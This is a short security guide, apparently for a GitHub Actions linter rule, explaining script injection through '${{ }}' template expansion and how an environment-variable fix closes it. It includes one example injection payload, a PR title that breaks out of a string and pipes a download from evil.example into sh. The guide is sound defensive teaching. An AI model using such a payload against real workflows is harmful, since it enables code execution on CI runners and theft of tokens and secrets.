# Script injection through template expansion

Related zizmor rule: template-injection

Expressions written as `${{ ... }}` are expanded by GitHub before the shell runs. The
value is pasted into the script as plain text. If the value comes from something an
outsider controls, such as a pull request title, a branch name, an issue body or a
commit message, the outsider is effectively writing part of the script.

Example of a vulnerable step:

```yaml
- run: |
    echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
```

A pull request titled `"; curl https://evil.example | sh; "` closes the string and runs
an attacker-chosen command on the runner. The command runs with everything the job has
access to, including its token and secrets.

The problem is not the `echo` command. Any command would be affected, because the
injection happens before the shell sees the script.

## Fix

Pass the untrusted value through an environment variable and let the shell read it as
data:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Thanks for the PR: $PR_TITLE"
```

The expression is now expanded into the environment, not into the script text, so the
shell treats the title as a string and never executes it.

Source: GitHub Docs, "Security hardening for GitHub Actions", section on understanding
the risk of script injections.
